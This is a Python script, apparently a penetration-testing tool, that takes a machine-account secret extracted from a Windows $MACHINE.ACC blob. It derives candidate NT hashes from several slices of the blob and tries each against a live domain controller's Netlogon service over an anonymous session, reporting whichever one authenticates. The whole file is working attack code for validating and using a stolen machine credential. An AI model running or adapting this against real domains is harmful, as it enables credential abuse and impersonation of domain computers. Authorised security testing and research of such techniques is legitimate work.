"""
NRPC oracle: validate whether the extracted machine secret can establish a Netlogon
secure channel via impacket (raw RPC, single binding => correct challenge correlation).
Tries several NThash derivations of the raw $MACHINE.ACC blob against the live DC.

Usage: python nrpc_oracle.py <raw-hex-file> <dc-fqdn> <computer-netbios>
"""
import sys
from Cryptodome.Hash import MD4
from impacket.dcerpc.v5 import nrpc, transport


def md4(data: bytes) -> bytes:
    h = MD4.new()
    h.update(data)
    return h.digest()


def trim0(b: bytes) -> bytes:
    return b.rstrip(b"\x00")


def attempt(dc: str, computer: str, nthash: bytes) -> int:
    binding = r"ncacn_np:%s[\PIPE\netlogon]" % dc
    rpct = transport.DCERPCTransportFactory(binding)
    rpct.set_credentials("", "", "", "", "")  # anonymous / null session
    dce = rpct.get_dce_rpc()
    dce.connect()
    dce.bind(nrpc.MSRPC_UUID_NRPC)

    client_chal = b"\x12" * 8
    resp = nrpc.hNetrServerReqChallenge(dce, dc + "\x00", computer + "\x00", client_chal)
    server_chal = resp["ServerChallenge"]

    session_key = nrpc.ComputeSessionKeyAES(None, client_chal, server_chal, nthash)
    client_cred = nrpc.ComputeNetlogonCredentialAES(client_chal, session_key)

    resp2 = nrpc.hNetrServerAuthenticate3(
        dce,
        dc + "\x00",
        computer + "$\x00",
        nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel,
        computer + "\x00",
        client_cred,
        0x612FFFFF,
    )
    return int(resp2["ErrorCode"])


def main():
    raw_hex = open(sys.argv[1], "r").read().strip()
    blob = bytes.fromhex(raw_hex)
    dc = sys.argv[2]
    computer = sys.argv[3]
    print("blob length:", len(blob))

    candidates = {
        "full": blob,
        "trim0": trim0(blob),
        "skip4": blob[4:],
        "skip4trim": trim0(blob[4:]),
        "skip16": blob[16:],
        "skip16trim": trim0(blob[16:]),
        "seg28_315": blob[28:316],
        "skip28trim": trim0(blob[28:]),
    }

    for name, material in candidates.items():
        nt = md4(material)
        try:
            ec = attempt(dc, computer, nt)
            status = "SUCCESS" if ec == 0 else ("0x%08x" % (ec & 0xFFFFFFFF))
            print("%-12s len=%-4d -> %s" % (name, len(material), status))
            if ec == 0:
                print("WINNER:", name)
                return
        except Exception as e:
            print("%-12s -> EXC %s" % (name, str(e)[:90]))

    print("No candidate succeeded via impacket.")


if __name__ == "__main__":
    main()
